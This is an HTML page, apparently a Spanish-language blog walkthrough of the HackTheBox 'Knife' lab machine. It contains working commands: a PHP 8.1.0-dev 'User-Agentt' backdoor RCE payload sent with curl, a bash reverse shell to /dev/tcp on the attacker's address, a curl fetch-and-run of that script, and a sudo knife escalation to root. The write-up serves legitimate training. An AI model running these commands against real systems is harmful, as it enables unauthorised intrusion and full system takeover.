@@ -1,0 +1,609 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB Knife - Bast1ant1c</title>
+<meta name="description" content="Vamos a resolver la maquina Knife de HackTheBox. ¡Let’s hack!">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Bast1ant1c">
+<meta property="og:title" content="HTB Knife">
+<meta property="og:url" content="http://localhost:4000/knife/">
+
+
+  <meta property="og:description" content="Vamos a resolver la maquina Knife de HackTheBox. ¡Let’s hack!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/knife/01inicio.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-04-28T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/knife/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Bast1ant1c",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Blog</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscar</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB Knife</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name"></h3>
+    
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB Knife">
+    <meta itemprop="description" content="Vamos a resolver la maquina Knife de HackTheBox. ¡Let’s hack!">
+    <meta itemprop="datePublished" content="April 28, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB Knife
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-04-28T00:00:00-05:00">April 28, 2022 </time> 
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/knife/01inicio.png">
+</p>
+
+<p>¡Hola!
+En esta ocasión vamos a resolver de la maquina <strong>Knife</strong> de <a href="https://app.hackthebox.com/">HackTheBox</a>.
+La maquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
+
+<h2 id="preparación">PREPARACIÓN</h2>
+
+<p>Para iniciar nuestra máquina, vamos a crear un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">knife</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">nmap</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir </span>knife
+❯ <span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
+<span class="nb">cd </span>knife
+❯ <span class="nb">mkdir </span>nmap exploit
+</code></pre></div></div>
+
+<h2 id="reconocimiento">RECONOCIMIENTO</h2>
+
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">nmap</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza <strong>ICMP</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.242 | <span class="nb">grep </span>ttl | <span class="nb">awk</span> <span class="s1">'{print $4,$6}'</span>
+10.10.10.242: <span class="nv">ttl</span><span class="o">=</span>63
+</code></pre></div></div>
+
+<p>Identificamos que es una maquina <strong>Linux</strong> debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTheBox).</p>
+
+<ul>
+  <li>TTL =&gt; 64	Linux</li>
+  <li>TTL =&gt; 128	Windows</li>
+</ul>
+
+<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.242 <span class="nt">-oG</span> openPorts | <span class="nb">grep </span>open
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> 10.10.10.242 <span class="nt">-oG</span> deepScan
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-17 13:38 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>10.10.10.242
+Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Podemos identificar que el puerto <code class="language-plaintext highlighter-rouge">80</code> tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.</p>
+
+<p align="center">
+<img src="/assets/images/knife/03page.png">
+</p>
+
+<p>Vamos a realizar un <strong>fuzzing</strong> por medio de la generación de múltiples peticiones con diferentes terminaciones a la página web, con el fin de detectar rutas de acceso a información o explotación, sin embargo, no es posible la extracción de información que fuera de ayuda para el ejercicio (solo muestro el comando para fines educativos).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
+</code></pre></div></div>
+
+<p>A continuación, vamos a realizar la enumeración de software utilizado para la creación de la página web a través de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.242/
+http://10.10.10.242/ <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.242], PHP[8.1.0-dev], Scrip&gt;
+</code></pre></div></div>
+
+<p>Como se puede ver, tenemos la versión <code class="language-plaintext highlighter-rouge">PHP 8.1.0-dev</code>, la cual vamos a buscar en la base de datos de exploits por medio de la utilidad <code class="language-plaintext highlighter-rouge">searchsploit</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit PHP 8.1.0-dev | <span class="nb">grep </span>dev
+PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution	| php/webapps/49933.py
+</code></pre></div></div>
+
+<p>Encontramos un exploit que genera un backdoor por medio de una modificación en las cabeceras de la petición web, todo esto por con el fin de lograr un RCE (Remote Command Excecution).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"User-Agentt: zerodiumsystem ('whoami');"</span>
+</code></pre></div></div>
+
+<h2 id="explotación">EXPLOTACIÓN</h2>
+
+<p>Bien, ahora que tenemos conocimiento de esta vulnerabilidad, vamo a probar en la maquina victima por medio de la utilidad <code class="language-plaintext highlighter-rouge">curl</code> que nos permite modificar parámetros como en este caso el <strong>User Agent</strong> (Entramos a la carpeta exploit antes de ejecutar nuestra prueba).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
+❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET http://10.10.10.242/ <span class="nt">-H</span> <span class="s2">"User-Agentt: zerodiumsystem ('whoami');"</span> | <span class="nb">head</span> <span class="nt">-n</span> 1
+james
+</code></pre></div></div>
+<p>¡Tenemos ejecución remota de comandos! Podemos ver que el usuario <code class="language-plaintext highlighter-rouge">james</code> es un usuario de la maquina víctima.</p>
+
+<p>Vamos a generar una reverse shell en bash para cargarla y después ejecutarla en la máquina, para esto creamos el archivo <code class="language-plaintext highlighter-rouge">escalation.sh</code> con el siguiente contenido.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>escalation.sh
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.12/5555 0&gt;&amp;1'</span>
+</code></pre></div></div>
+
+<p>Ahora que tenemos nuestra reverse shell, vamos a iniciar en nuestra maquina un servidor web con ayuda de <code class="language-plaintext highlighter-rouge">python</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p>Luego de tener nuestro servidor activo, generamos una petición al servidor web victima por medio del exploit encontrado anteriormente, en esta ocasión para <strong>subir</strong> el archivo en la maquina vulnerable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET http://10.10.10.242/ <span class="nt">-H</span> <span class="s1">'User-Agentt: zerodiumsystem(" curl http://10.10.14.12:8000/escalation.sh -o /tmp/escalation.sh ");'</span>
+</code></pre></div></div>
+
+<p>Al tener la reverse shell solo queda ejecutarlo, sin embargo, antes de ejecutar el comando es necesario ponerse en escucha por el puerto que se indicó al momento de configurar la reverse shell, para este caso es el puerto <code class="language-plaintext highlighter-rouge">5555</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 5555
+Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+</code></pre></div></div>
+<p>Finalmente ejecutamos el comando para accionar la reverse shell desde la maquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET http://10.10.10.242/ <span class="nt">-H</span> <span class="s1">'User-Agentt: zerodiumsystem(" bash /tmp/escalation.sh ");'</span>
+</code></pre></div></div>
+
+<p>Vamos a verlo en acción.</p>
+
+<p align="center">
+<img src="/assets/images/knife/04intrusion.png">
+</p>
+
+<p>¡Obtenemos acceso a la maquina!</p>
+
+<p>El primer paso luego de obtener una shell es realizar el tratamiento de la TTY, por lo que dejare el procedimiento de cómo realizarlo (Esto se hace inicialmente en la maquina a la cual tenemos acceso).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+^Z
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
+</span>reset
+xterm
+<span class="nb">export </span><span class="nv">XTERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</code></pre></div></div>
+
+<p>Ahora que estamos dentro de la maquina con el usuario <code class="language-plaintext highlighter-rouge">james</code>, vamos a escalar privilegios para lograr ser <code class="language-plaintext highlighter-rouge">root</code>, pero antes de eso vamos a leer la flag del usuario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-name</span> user.txt 2&gt;/dev/null
+./home/james/user.txt
+james@knife:/<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-c</span> 10 ./home/james/user.txt<span class="p">;</span> <span class="nb">echo
+</span>b2bf0e7aa5
+</code></pre></div></div>
+<h2 id="escalamiento">ESCALAMIENTO</h2>
+
+<p>¡Perfecto! Ahora si vamos a revisar permisos por medio del comando <code class="language-plaintext highlighter-rouge">sudo -l</code>, así podremos ver qué tipo de utilidades puede ejecutar el usuario <code class="language-plaintext highlighter-rouge">james</code> con privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>james on knife:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on knife:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
+</code></pre></div></div>
+
+<p>Vemos que <code class="language-plaintext highlighter-rouge">james</code> puede ejecutar el comando <code class="language-plaintext highlighter-rouge">knife</code> sin necesidad de ingresar credenciales.</p>
+
+<p>Por medio del recurso <a href="https://gtfobins.github.io/gtfobins/knife/">GTFOBins</a> identificamos una vía potencial de escalamiento de privilegios, ejecutando lo siguiente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
+</code></pre></div></div>
+
+<p>Procedemos a realizar la prueba en nuestra maquina vulnerada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/<span class="nv">$ </span><span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
+
+<p>¡Logramos tener acceso a la maquina como <code class="language-plaintext highlighter-rouge">root</code>!</p>
+
+<p>Solo hace falta buscar la flag correspondiente y eso sería todo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># find . -name root.txt 2&gt;/dev/null</span>
+./root/root.txt
+<span class="c"># head -c 10 ./root/root.txt ; echo</span>
+4b01b07a6d
+</code></pre></div></div>
+
+<p>¡Hemos logrado nuestra primera maquina del blog en HackTheBox!</p>
+
+<p align="center">
+<img src="/assets/images/knife/05finish.png">
+</p>
+
+<p>Por último, les recomiendo seguir <strong>practicando</strong> y si pueden generar contenido, mucho mejor! Espero les pueda servir de algo este material.</p>
+
+<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
+
+<p><strong>Nos vemos en otro bit.</strong></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#knife" class="page__taxonomy-item" rel="tag">Knife</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-04-28T00:00:00-05:00">April 28, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/spring4shell/" class="pagination--pager" title="THM Spring4Shell
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+<!--
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+-->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 Bast1ant1c</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
